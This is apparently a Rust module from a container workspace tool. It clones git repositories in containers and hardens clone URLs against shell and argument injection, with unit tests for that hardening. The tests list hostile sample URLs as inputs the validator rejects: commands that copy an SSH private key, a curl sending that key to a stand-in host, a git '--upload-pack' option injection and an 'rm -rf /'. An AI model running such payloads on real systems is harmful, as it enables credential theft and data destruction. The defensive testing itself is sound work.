use gix_config::File;
use lazy_static::lazy_static;
use regex::Regex;

use crate::{
    api::{GitApi, config::ConfigBody, container},
    config::config::FileFormat,
    constants,
    model::{
        types::{AnyError, ContainerResult, RunMode, RunSpec},
        volume::{RoozVolume, VolumeFile},
    },
};

use super::{id, labels::Labels, sh, ssh};

lazy_static! {
    // Either scheme://[user@]host[:port]/path or the scp-like [user@]host:path.
    static ref GIT_URL: Regex = Regex::new(
        r"^(?:[a-zA-Z][a-zA-Z0-9+.\-]*://\S+|[A-Za-z0-9._\-]+(?:@[A-Za-z0-9._\-]+)?:\S+)$"
    )
    .unwrap();
}

// Clone URLs reach a shell (quoted) and git's argv, so both layers need guarding:
// whitespace and control characters cannot appear in a real URL, and a leading
// dash would make git parse the URL as an option.
pub fn validate_clone_url(url: &str) -> Result<(), AnyError> {
    if url.is_empty() {
        return Err("git URL must not be empty".into());
    }
    if url.starts_with('-') {
        return Err(format!("git URL must not start with '-': '{}'", url).into());
    }
    if url.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return Err(format!(
            "git URL must not contain whitespace or control characters: '{}'",
            url
        )
        .into());
    }
    if !GIT_URL.is_match(url) {
        return Err(format!(
            "not a well-formed git URL: '{}' (expected scheme://host/path or user@host:path)",
            url
        )
        .into());
    }
    Ok(())
}

#[derive(Clone, Debug)]
pub enum CloneUrls {
    Root { url: String },
    Extra { urls: Vec<String> },
}

#[derive(Clone, Debug)]
pub struct CloneEnv {
    pub image: String,
    pub uid: String,
    pub workspace_key: String,
    pub working_dir: String,
    pub depth_override: Option<i64>,
    pub force_pull: bool,
}

impl Default for CloneEnv {
    fn default() -> Self {
        Self {
            image: constants::DEFAULT_IMAGE.to_string(),
            uid: constants::DEFAULT_UID.to_string(),
            workspace_key: Default::default(),
            working_dir: constants::WORK_DIR.to_string(),
            depth_override: None,
            force_pull: false,
        }
    }
}

#[derive(Clone, Debug)]
pub struct RootRepoCloneResult {
    pub config: Option<(String, Option<String>, FileFormat)>,
    pub dir: String,
}

fn get_clone_dir(
    root_dir: &str,
    git_ssh_url: &str,
    git_config: &Option<String>,
) -> Result<String, AnyError> {
    let mut git_url = git_ssh_url.to_string();
    log::debug!("Original URL: {}", git_url);
    if let Some(git_config) = git_config {
        let config = File::try_from(git_config.as_str())?;
        let url_lookup = config.sections_by_name("url").map(|f| {
            f.map(|s| (s.body().value("insteadOf"), s.header().subsection_name()))
                .filter_map(|(key, value)| match (key?, value?) {
                    (k, v) => Some((k.to_string(), v.to_string())),
                })
                .collect::<Vec<(_, _)>>()
        });
        if let Some(lookup) = url_lookup {
            if let Some((alias, url)) = lookup
                .into_iter()
                .find(|(alias, _)| git_ssh_url.starts_with(alias))
            {
                git_url = git_ssh_url
                    .strip_prefix(&alias)
                    .map(|rest| format!("{}{}", url, rest))
                    .unwrap();
                log::debug!("Expanded URL: {}", git_url);
            }
        }
    }

    let clone_work_dir = git_url
        .split(&['/'])
        .last()
        .unwrap_or("repo")
        .replace(".git", "")
        .to_string();

    if clone_work_dir.is_empty() || clone_work_dir == "." || clone_work_dir == ".." {
        return Err(format!(
            "could not derive a clone directory from URL: '{}'",
            git_ssh_url
        )
        .into());
    }

    log::debug!("Clone dir: {}", &clone_work_dir);

    let work_dir = format!("{}/{}", root_dir, clone_work_dir.clone());

    log::debug!("Full clone dir: {:?}", &work_dir);
    Ok(work_dir)
}

// `--` stops git from parsing a URL as an option; the shell quoting keeps the
// whole value a single argument.
fn clone_line(clone_dir: &str, depth: &str, url: &str) -> String {
    format!(
        "ls {}/.git > /dev/null 2>&1 || git -c include.path=/tmp/rooz/.gitconfig clone --filter=blob:none {} -- {}\n",
        sh::quote(clone_dir),
        depth,
        sh::quote(url)
    )
}

fn pull_line(clone_dir: &str) -> String {
    let dir = sh::quote(clone_dir);
    format!(
        "ls {}/.git > /dev/null 2>&1 && git -C {} -c include.path=/tmp/rooz/.gitconfig pull\n",
        dir, dir
    )
}

impl<'a> GitApi<'a> {
    async fn clone_from_spec(&self, spec: &CloneEnv, urls: &CloneUrls) -> Result<String, AnyError> {
        let mut clone_script = String::new();
        let all_urls: Vec<String> = match &urls {
            CloneUrls::Root { url } => vec![url.to_string()],
            CloneUrls::Extra { urls } => {
                urls.iter().map(|x| x.to_string()).collect::<Vec<String>>()
            }
        };

        let depth = if let Some(depth) = spec.depth_override {
            format!("--depth={}", depth)
        } else {
            "".to_string()
        };

        for url in all_urls {
            validate_clone_url(&url)?;
            let clone_dir = get_clone_dir(
                &spec.working_dir,
                &url,
                &self.api.get_system_config().await?.gitconfig,
            )?;
            clone_script.push_str(&clone_line(&clone_dir, &depth, &url));

            if spec.force_pull {
                clone_script.push_str(&pull_line(&clone_dir));
            }
        }

        let clone_cmd = container::inject(&clone_script, "clone.sh");
        // IMPORTANT: no workspace label here as those do not really belong to workspace
        // it will get refactored to use one shot
        let labels = Labels::from(&[Labels::role("git")]);
        let mut mounts = vec![ssh::mount("/tmp/.ssh")];

        let mut volumes: Vec<RoozVolume> = vec![];

        if let Some(gitconfig) = &self.api.get_system_config().await?.gitconfig {
            let git_config_vol =
                RoozVolume::config_data(&spec.workspace_key, "/tmp/rooz/", None, None);
            self.api
                .volume
                .write_files(
                    &git_config_vol,
                    &[VolumeFile::new(".gitconfig", gitconfig)],
                    Some(spec.uid.parse::<i32>()?),
                )
                .await?;
            volumes.push(git_config_vol);
        }

        volumes.push(RoozVolume::work(&spec.workspace_key, &spec.working_dir));

        self.api.volume.ensure_mounts(&volumes, None).await?;

        for vol in &volumes {
            mounts.push(vol.to_mount(None));
        }

        let run_spec = RunSpec {
            reason: "git-clone",
            image: &spec.image,
            uid: &spec.uid,
            work_dir: Some(&spec.working_dir),
            container_name: &id::random_suffix("rooz-git"),
            workspace_key: &spec.workspace_key,
            mounts: Some(mounts),
            command: constants::default_command(),
            privileged: false,
            force_recreate: false,
            run_mode: RunMode::Git,
            labels,
            ..Default::default()
        };

        if let ContainerResult::Created { id } = self.api.container.create(run_spec).await? {
            self.api.container.start(&id).await?;
            self.api.exec.ensure_user(&id).await?;
            self.api
                .exec
                .chown(&id, &spec.uid.parse::<i32>()?, &spec.working_dir)
                .await?;

            self.api
                .exec
                .tty(
                    "git-clone",
                    &id,
                    None,
                    None,
                    Some(clone_cmd.iter().map(String::as_str).collect()),
                )
                .await?;
            Ok(id.to_string())
        } else {
            unreachable!("Random suffix gets generated each time")
        }
    }

    pub async fn clone_root_repo(
        &self,
        url: &str,
        spec: &CloneEnv,
    ) -> Result<RootRepoCloneResult, AnyError> {
        let container_id = self
            .clone_from_spec(&spec, &CloneUrls::Root { url: url.into() })
            .await?;
        let clone_dir = get_clone_dir(
            &spec.working_dir,
            &url,
            &self.api.get_system_config().await?.gitconfig,
        )?;
        let config = self
            .config
            .try_read_config(&container_id, &clone_dir)
            .await?;
        self.api.container.kill(&container_id, false).await?;

        Ok(RootRepoCloneResult {
            config,
            dir: clone_dir,
        })
    }

    pub async fn clone_extra_repos(
        &self,
        spec: CloneEnv,
        urls: Vec<String>,
    ) -> Result<(), AnyError> {
        let container_id = self
            .clone_from_spec(&spec, &CloneUrls::Extra { urls })
            .await?;
        self.api.container.kill(&container_id, false).await?;
        Ok(())
    }

    pub async fn clone_config_repo(
        &self,
        spec: CloneEnv,
        url: &str,
        path: &str,
    ) -> Result<(Option<ConfigBody>, String), AnyError> {
        let container_id = self
            .clone_from_spec(
                &CloneEnv {
                    depth_override: Some(1),
                    ..spec.clone()
                },
                &CloneUrls::Extra {
                    urls: vec![url.into()],
                },
            )
            .await?;
        let clone_dir = get_clone_dir(
            &spec.working_dir,
            &url,
            &self.api.get_system_config().await?.gitconfig,
        )?;
        let file_format = FileFormat::from_path(path);
        let result = self
            .config
            .read_config_body(&container_id, &clone_dir, file_format, Some(path))
            .await?;
        self.api.container.kill(&container_id, false).await?;
        Ok((result, clone_dir))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn well_formed_urls_pass() {
        for url in [
            "https://github.com/queil/rooz.git",
            "http://gitea.local:3000/a/b.git",
            "ssh://git@github.com:22/queil/rooz.git",
            "git@github.com:queil/rooz.git",
            "file:///srv/repos/rooz.git",
        ] {
            assert!(validate_clone_url(url).is_ok(), "rejected: {}", url);
        }
    }

    #[test]
    fn injection_payloads_are_rejected() {
        for url in [
            "",
            "https://attacker.invalid/repo; cat /tmp/.ssh/id_ed25519 > /tmp/pwned",
            "https://x.git && cat /tmp/.ssh/id_ed25519 > /tmp/pwned",
            "https://attacker.invalid/x'; curl http://evil/ -d @/tmp/.ssh/id_ed25519 #",
            "--upload-pack=touch /tmp/pwned",
            "https://x.git\nrm -rf /",
            "not a url",
        ] {
            assert!(validate_clone_url(url).is_err(), "accepted: {:?}", url);
        }
    }

    #[test]
    fn clone_line_quotes_url_and_dir() {
        let line = clone_line("/work/re'po", "--depth=1", "https://h/a'b.git");
        assert!(line.contains(r"ls '/work/re'\''po'/.git"), "{}", line);
        assert!(line.ends_with("-- 'https://h/a'\\''b.git'\n"), "{}", line);
    }

    #[test]
    fn pull_line_quotes_dir() {
        let line = pull_line("/work/re'po");
        assert_eq!(line.matches(r"'/work/re'\''po'").count(), 2, "{}", line);
    }

    #[test]
    fn hostile_url_stays_one_argument_in_a_real_shell() {
        // the payload shape from the report: the injected command must not run,
        // and the URL must reach git as a single (bogus) argument
        let dir = std::env::temp_dir().join("rooz-clone-injection-test");
        let _ = std::fs::remove_file(&dir);
        let hostile = format!("x'; touch {}; #", dir.display());
        let line = clone_line("/work/repo", "", &hostile);
        let out = std::process::Command::new("sh")
            .arg("-c")
            .arg(line.replace(
                "git -c include.path=/tmp/rooz/.gitconfig clone",
                "printf '%s\\n'",
            ))
            .output()
            .unwrap();
        let stdout = String::from_utf8(out.stdout).unwrap();
        assert!(!dir.exists(), "injected command executed");
        assert!(
            stdout.lines().any(|l| l == hostile),
            "url did not survive as one argument: {}",
            stdout
        );
    }

    #[test]
    fn clone_dir_derivation_rejects_dot_segments() {
        assert!(get_clone_dir("/work", "https://h/a/..", &None).is_err());
        assert!(get_clone_dir("/work", "https://h/a/", &None).is_err());
        assert_eq!(
            get_clone_dir("/work", "https://h/rooz.git", &None).unwrap(),
            "/work/rooz"
        );
    }
}
